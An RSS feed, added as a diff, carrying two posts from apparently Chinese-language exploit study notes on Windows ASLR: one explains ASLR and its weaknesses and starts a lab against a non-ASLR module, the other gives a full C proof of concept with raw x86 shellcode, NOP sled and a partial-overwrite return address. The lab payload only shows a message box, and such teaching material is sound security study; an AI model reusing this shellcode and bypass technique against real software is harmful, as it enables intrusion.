@@ -1,0 +1,332 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>内存地址布局随机化 on Misaka的秘密花园</title><link>https://blog.moeomu.com/zh-cn/tags/%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80%E5%B8%83%E5%B1%80%E9%9A%8F%E6%9C%BA%E5%8C%96/</link><description>Recent content in 内存地址布局随机化 on Misaka的秘密花园</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Thu, 26 Nov 2020 17:54:00 +0800</lastBuildDate><atom:link href="https://blog.moeomu.com/zh-cn/tags/%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80%E5%B8%83%E5%B1%80%E9%9A%8F%E6%9C%BA%E5%8C%96/index.xml" rel="self" type="application/rss+xml"/><item><title>漏洞利用学习笔记-018-利用部分覆盖定位</title><link>https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-018-%E5%88%A9%E7%94%A8%E9%83%A8%E5%88%86%E8%A6%86%E7%9B%96%E5%AE%9A%E4%BD%8D/</link><pubDate>Thu, 26 Nov 2020 17:54:00 +0800</pubDate><guid>https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-018-%E5%88%A9%E7%94%A8%E9%83%A8%E5%88%86%E8%A6%86%E7%9B%96%E5%AE%9A%E4%BD%8D/</guid><description>&lt;p>本文来源：&lt;a class="link" href="https://blog.moeomu.com/zh-cn/posts/%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e5%ad%a6%e4%b9%a0%e7%ac%94%e8%ae%b0-018-%e5%88%a9%e7%94%a8%e9%83%a8%e5%88%86%e8%a6%86%e7%9b%96%e5%ae%9a%e4%bd%8d/" >Moeomu的博客&lt;/a>&lt;/p>
+&lt;h2 id="原理">原理&lt;/h2>
+&lt;ul>
+&lt;li>映像随机化指示对映像加载基址的全两个字节随机化处理，这样做的后果是跳板始终可用，因此可以利用这一点去绕过ASLR&lt;/li>
+&lt;li>如果攻击memcpy的话，可以将返回值控制在&lt;code>0xXXXX0000&lt;/code>~&lt;code>0xXXXXFFFF&lt;/code>之间，而攻击str类函数攻击，可以将控制地址为&lt;code>0xXXXX0100&lt;/code>~&lt;code>0xXXXX00FF&lt;/code>之间的一个&lt;/li>
+&lt;/ul>
+&lt;h2 id="过程">过程&lt;/h2>
+&lt;ul>
+&lt;li>首先在编译完的程序内找到一条jmp eax的汇编码，随后将它的地址的低word作为&lt;code>off by word&lt;/code>的地址，填入shellcode&lt;/li>
+&lt;li>计算好缓冲区大小，溢出后即可正常&lt;/li>
+&lt;/ul>
+&lt;h2 id="代码">代码&lt;/h2>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-cpp" data-lang="cpp">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;memory.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">char&lt;/span> &lt;span class="n">shellcode&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="o">=&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&lt;/span>&lt;span class="s">&amp;#34;&lt;/span> &lt;span class="c1">// payload
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x53\x68\x6B\x61\x6F\x6F\x68\x4D\x69\x73\x61\x8B\xC4\x53\x50\x50&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x90\x90\x90\x90&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x2A\x23&lt;/span>&lt;span class="s">&amp;#34;&lt;/span> &lt;span class="c1">// off by word
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="nf">test&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">tt&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">256&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">tt&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">shellcode&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">262&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">tt&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">temp&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">200&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">test&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="开始实验">开始实验&lt;/h2>
+&lt;blockquote>
+&lt;p>实验环境：系统：Windows Vista SP0，系统DEP状态：Optin默认，编译器：Visual Studio 2008，优化：禁用优化，GS选项：关闭，DEP选项：/NXCOMPAT:NO，build版本：release&lt;/p>
+&lt;/blockquote>
+&lt;ul>
+&lt;li>编译程序，运行，直接弹出窗口并成功，重启也一样，如图&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-018-%E5%88%A9%E7%94%A8%E9%83%A8%E5%88%86%E8%A6%86%E7%9B%96%E5%AE%9A%E4%BD%8D/success.png"
+width="688"
+height="445"
+srcset="https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-018-%E5%88%A9%E7%94%A8%E9%83%A8%E5%88%86%E8%A6%86%E7%9B%96%E5%AE%9A%E4%BD%8D/success_hube6c3e136f097b87001e3e5a35811a31_69467_480x0_resize_box_3.png 480w, https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-018-%E5%88%A9%E7%94%A8%E9%83%A8%E5%88%86%E8%A6%86%E7%9B%96%E5%AE%9A%E4%BD%8D/success_hube6c3e136f097b87001e3e5a35811a31_69467_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="成功"
+class="gallery-image"
+data-flex-grow="154"
+data-flex-basis="371px"
+>&lt;/p></description></item><item><title>漏洞利用学习笔记-017-ASLR简介</title><link>https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-017-aslr%E7%AE%80%E4%BB%8B/</link><pubDate>Tue, 24 Nov 2020 21:12:00 +0800</pubDate><guid>https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-017-aslr%E7%AE%80%E4%BB%8B/</guid><description>&lt;p>本文来源：&lt;a class="link" href="https://blog.moeomu.com/zh-cn/posts/%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e5%ad%a6%e4%b9%a0%e7%ac%94%e8%ae%b0-017-aslr%e7%ae%80%e4%bb%8b/" >Moeomu的博客&lt;/a>&lt;/p>
+&lt;h2 id="aslr技术简介">ASLR技术简介&lt;/h2>
+&lt;blockquote>
+&lt;p>纵观前面介绍的所有漏洞利用方法都有着一个共同的特征：都需要确定一个明确的跳转地址。无论是JMP ESP等通用跳板指令还是Ret2Libc使用的各指令，我们都要先确定这条指令的入口点。所谓惹不起躲得起，微软的ASLR(Address Space Layout Randomization)技术就是通过加载程序的时候不再使用固定的基址加载，从而干扰shellcode定位的一种保护机制&lt;/p>
+&lt;p>实际上ASLR的概念在Windows XP时代就已经提出来了，只不过XP上面的ASLR功能很有限，只是对PEB和TEB进行了简单的随机化处理，而对于模块的加载基址没有进行随机化处理，直到Windows Vista出现后，ASLR才真正开始发挥作用&lt;/p>
+&lt;p>与SafeSEH类似ASLR的实现也需要程序自身的支持和操作系统的双重支持，其中程序的支持不是必需的&lt;/p>
+&lt;/blockquote>
+&lt;ul>
+&lt;li>支持ASLR的程序在它的PE头中会设置&lt;code>IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE&lt;/code>标识来说明其支持ASLR。微软从Visual Studio 2005 SP1开始加入了&lt;code>/dynamicbase&lt;/code>链接选项来帮我们完成这个任务，我们只需要在编译程序的时候启用&lt;code>/dynmicbase&lt;/code>链接选项，编译好的程序就支持ASLR了&lt;/li>
+&lt;/ul>
+&lt;h3 id="映像随机化">映像随机化&lt;/h3>
+&lt;ul>
+&lt;li>映像随机化是在PE文件映射到内存时，对其加载的虚拟地址进行随机化处理，这个地址是在系统启动时确定的，系统重启后这个地址会变化&lt;/li>
+&lt;li>可能是出于兼容性的考虑，微软在系统中设置了映像随机化的开关，用户可以通过设置注册表中&lt;code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionM anager\MemoryManagement\MoveImages&lt;/code>的键值来设定映像随机化的工作模式
+&lt;ul>
+&lt;li>设置为&lt;code>0&lt;/code>时映像随机化将禁用&lt;/li>
+&lt;li>设置为&lt;code>−1&lt;/code>时强制对可随机化的映像进行处理，无论是否设置&lt;code>IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE&lt;/code>标识&lt;/li>
+&lt;li>设置为其他值时为正常工作模式，只对具有随机化处理标识的映像进行处理&lt;/li>
+&lt;li>如果注册表中不存在&lt;code>MoveImages&lt;/code>，大家可以手工建立名称为&lt;code>MoveImages&lt;/code>，类型为&lt;code>DWORD&lt;/code>的值，并根据需要设置它的值&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="堆栈随机化">堆栈随机化&lt;/h3>
+&lt;ul>
+&lt;li>这项措施是在程序运行时随机的选择堆栈的基址，与映像基址随机化不同的是堆栈的基址不是在系统启动的时候确定的，而是在打开程序的时候确定的，也就是说同一个程序任意两次运行时的堆栈基址都是不同的，进而各变量在内存中的位置也就是不确定的&lt;/li>
+&lt;li>将以下程序在VS2008中编译，在XP和Vista上分别运行两次，得到如下图的结果&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-cpp" data-lang="cpp">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">heap&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">malloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">stack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Address of heap:%#0.4x&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">Address of stack:%#0.4x&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">heap&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">stack&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">getchar&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://blog.moeomu.com/Windows%20Vista.png"
+loading="lazy"
+alt="Windows Vista"
+>
+&lt;img src="https://blog.moeomu.com/Windows%20XP.png"
+loading="lazy"
+alt="Windows XP"
+>&lt;/p>
+&lt;ul>
+&lt;li>可以看出，Vista上堆地址相去甚远，而XP上完全相同&lt;/li>
+&lt;/ul>
+&lt;h3 id="peb和teb的随机化">PEB和TEB的随机化&lt;/h3>
+&lt;ul>
+&lt;li>获取当前进程的TEB和PEB很简单，TEB存放在&lt;code>FS:0&lt;/code>和&lt;code>FS:[0x18]&lt;/code>处，PEB存放在TEB偏移&lt;code>0x30&lt;/code>的位置，可以通过如下代码来获取当前进程的TEB和PEB&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-cpp" data-lang="cpp">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">teb&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">peb&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">__asm&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">mov&lt;/span> &lt;span class="n">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nl">FS&lt;/span>&lt;span class="p">:[&lt;/span>&lt;span class="mh">0x18&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">mov&lt;/span> &lt;span class="n">teb&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">eax&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">mov&lt;/span> &lt;span class="n">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">dword&lt;/span> &lt;span class="n">ptr&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">eax&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mh">0x30&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">mov&lt;/span> &lt;span class="n">peb&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">eax&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;PEB:%#x&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">TEB:%#x&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">peb&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">teb&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">getchar&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>在Vista上测试运行，结果如图&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-017-aslr%E7%AE%80%E4%BB%8B/PEB-TEB-random-Vista.png"
+width="445"
+height="223"
+srcset="https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-017-aslr%E7%AE%80%E4%BB%8B/PEB-TEB-random-Vista_hu00ba9e2f2bf089356c2e504e0ca73284_72259_480x0_resize_box_3.png 480w, https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-017-aslr%E7%AE%80%E4%BB%8B/PEB-TEB-random-Vista_hu00ba9e2f2bf089356c2e504e0ca73284_72259_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="PEB/TEB-random-Vista"
+class="gallery-image"
+data-flex-grow="199"
+data-flex-basis="478px"
+>&lt;/p>
+&lt;ul>
+&lt;li>可以看出，效果非常差劲，PEB地址只随机化了一个字节，而且还是非常有规律，TEB基本没变过&lt;/li>
+&lt;/ul>
+&lt;h3 id="aslr的缺陷">ASLR的缺陷&lt;/h3>
+&lt;ul>
+&lt;li>不难看出，ASLR随机化映像的时候，虽然模块的加载基址改变了，但是各个模块的入口点的低位两个字节是不会改变的，举例：原基址：&lt;code>0x00401234&lt;/code>，随机化后基址变为：&lt;code>0x67291234&lt;/code>，因此可以以此攻击它&lt;/li>
+&lt;/ul>
+&lt;h2 id="攻击未启用aslr的模块">攻击未启用ASLR的模块&lt;/h2>
+&lt;h3 id="准备工作">准备工作&lt;/h3>
+&lt;blockquote>
+&lt;p>实验环境：Windows Vista SP0，IE7，Adobe Flash Player 9.0.124&lt;/p>
+&lt;/blockquote>
+&lt;ul>
+&lt;li>虽然书上要求使用9.0.262版本，但是实在是找不到，就以9.0.124来替代了，&lt;a class="link" href="https://pan.moeomu.com/Tutorial/0Day%e5%ae%89%e5%85%a8-%e8%b5%84%e6%96%99/flashplayer9r124_winax.exe" target="_blank" rel="noopener"
+>点此下载&lt;/a>&lt;/li>
+&lt;li>存在漏洞的OCX控件在之前的实验中已经编译了一个了，因此就使用那个了，&lt;a class="link" href="https://pan.moeomu.com/Tutorial/0Day%e5%ae%89%e5%85%a8-%e8%b5%84%e6%96%99/VulnerAX_SEH/VulnerAX_SEH.ocx" target="_blank" rel="noopener"
+>点此下载&lt;/a>，此控件ctrl class object id：&lt;code>ACA3927C-6BD1-4B4E-8697-72481279AAEC&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h3 id="步骤">步骤&lt;/h3>
+&lt;ul>
+&lt;li>重启系统查看ASLR模块启用情况&lt;/li>
+&lt;/ul>
